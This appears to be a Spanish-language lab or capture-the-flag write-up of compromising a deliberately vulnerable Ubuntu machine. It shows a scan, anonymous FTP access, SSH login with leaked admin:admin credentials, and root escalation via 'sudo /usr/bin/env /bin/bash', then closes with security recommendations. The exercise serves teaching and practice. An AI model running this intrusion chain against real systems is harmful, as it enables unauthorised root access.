@@ -1,0 +1,194 @@
+--------------- REPORTER INVICTUS ------------------------
+
+REALIZADO: Alfonso Company
+FECHA:23/06/2025
+
+
+-INDICE-
+1/ Descripción General
+2/ Reconocimiento
+3/ Explotación
+6/ ESCALDA PRIVILEGIOS
+
+
+
+
+
+1/ DESCRIPCION GENERAL
+
+1. Descripción general
+
+Se ha desplegado una máquina vulnerable basada en Ubuntu 20.04, con servicios:
+
+    Apache2 en puerto 80
+
+    OpenSSH en puerto 22
+
+    vsftpd (FTP) en puerto 21, con acceso anónimo habilitado y posibilidad de subir archivos
+
+Además, se han creado dos usuarios:
+
+    admin con contraseña admin, con privilegios sudo limitados para ejecutar /usr/bin/env sin contraseña (vulnerabilidad de escalada).
+
+    user con contraseña user, usuario normal.
+
+2. Objetivo
+
+Conseguir acceso a la máquina y escalar privilegios hasta root, explotando:
+
+    Servicio FTP anónimo (con permisos de escritura en directorio /var/ftp/incoming)
+
+    Vulnerabilidad en la configuración sudo para el usuario admin
+
+
+2/ RECONOCIMIENTO
+
+3. Reconocimiento
+3.1 Escaneo de puertos (Nmap)
+
+nmap -p 21,22,80 172.17.0.2
+
+Resultados:
+Puerto	Estado	Servicio
+21	abierto	ftp
+22	abierto	ssh
+80	abierto	http
+
+
+3.2 Conexión FTP
+
+ftp 172.17.0.2
+
+    El servidor responde con el banner: 220 (vsFTPd 3.0.5)
+
+    Intento de login con usuario anonymous
+
+    Acceso concedido sin contraseña (o con cualquier password)
+
+    Se visualiza el archivo LEEME.txt y el directorio incoming
+
+ftp> ls
+-rw-r--r--    1 0        0             206 Jun 25 11:53 LEEME.txt
+drwxrwxrwx    1 0        0            4096 Jun 25 11:53 incoming
+
+
+3.2.1 LEER EL ARCHIBO LEEME.txt
+
+┌──(root㉿kali)-[/home/kali/invictus]
+└─# ftp 172.17.0.2   
+Connected to 172.17.0.2.
+
+220 (vsFTPd 3.0.5)
+Name (172.17.0.2:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls
+229 Entering Extended Passive Mode (|||58261|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             206 Jun 25 11:53 LEEME.txt
+drwxrwxrwx    1 0        0            4096 Jun 25 11:53 incoming
+226 Directory send OK.
+
+      // COPIAMOS EL ARCHIBO LEEME.txt A NUESTRO DIRECTORIO ACTUAL CON..
+ftp> get LEEME.txt
+
+local: LEEME.txt remote: LEEME.txt
+229 Entering Extended Passive Mode (|||52705|)
+150 Opening BINARY mode data connection for LEEME.txt (206 bytes).
+100% |**********************************************************|   206        3.27 MiB/s    00:00 ETA
+226 Transfer complete.
+206 bytes received in 00:00 (392.14 KiB/s)
+
+// EN NUESTRO DIRECTORIO PODEMOS LEER CON NANO EL ARCHIBO EXPORTADO LEEME.txt
+
+
+
+4. Análisis de la información sensible
+
+Contenido de LEEME.txt:
+
+Sometimes FTP drops more than just files...
+
+# [SECURITY] Privileged user activity detected
+# [AUTH] sudo: user=admin cmd=env
+# [INFO] Weak password detected -> admin:admin
+
+Check incoming dir for uploads.
+
+
+
+5. Explotación
+
+5.1 Acceso FTP Anónimo
+
+Con acceso anónimo en FTP, el atacante puede subir archivos a /var/ftp/incoming debido a los permisos 777.
+
+Esto permite, por ejemplo, subir una webshell, archivos maliciosos, o incluso archivos para escalar privilegios si luego se combinan con vulnerabilidades locales.
+
+
+
+5.2 Conexión SSH con usuario admin
+
+Con las credenciales filtradas en LEEME.txt:
+
+ssh admin@172.17.0.2
+
+Password: admin
+
+El acceso SSH se consigue.
+
+
+6/ESCALADA DE PRIVILEGIOS
+
+6.1 Escalada de privilegios con sudo / env
+
+El usuario admin tiene permisos sudo limitados para ejecutar sin contraseña /usr/bin/env:
+
+sudo /usr/bin/env /bin/bash
+
+Esto abre una shell con privilegios root, ya que env puede lanzar una shell con permisos elevados debido a la configuración sudoers.
+
+
+6.2 Confirmación de privilegios
+
+whoami
+root
+
+Se confirma que el atacante ahora tiene acceso root.
+
+
+6. Evidencia
+
+Archivo flag creado en /root/flag.txt:
+
+cat /root/flag.txt
+flag{pr1v1l3g3_escal4t10n_succ3ssful}
+
+
+
+7. Resumen
+Paso	Acción	Resultado
+1. Escaneo	nmap para identificar puertos	Puertos 21, 22 y 80 abiertos
+2. FTP anónimo	Conexión con usuario anonymous	Acceso FTP concedido
+3. Revisión LEEME.txt	Encontrar credenciales y pistas	Usuario admin:admin detectado
+4. SSH login	Acceso con admin	Login exitoso
+5. Escalada privilegios	sudo /usr/bin/env /bin/bash	Shell root conseguida
+6. Verificación	Leer flag	Flag obtenida
+
+
+
+10/ MEDIDAS APOTAR PARA EVITAR LAS VULNERABILIDADES
+
+8. Recomendaciones de seguridad
+
+    Deshabilitar acceso anónimo FTP (anonymous_enable=NO) o eliminar el servicio FTP si no es necesario.
+
+    No permitir ejecución de env vía sudo sin contraseña para usuarios no confiables.
+
+    Usar contraseñas robustas para usuarios privilegiados.
+
+    Revisar logs de FTP para detectar actividad sospechosa.
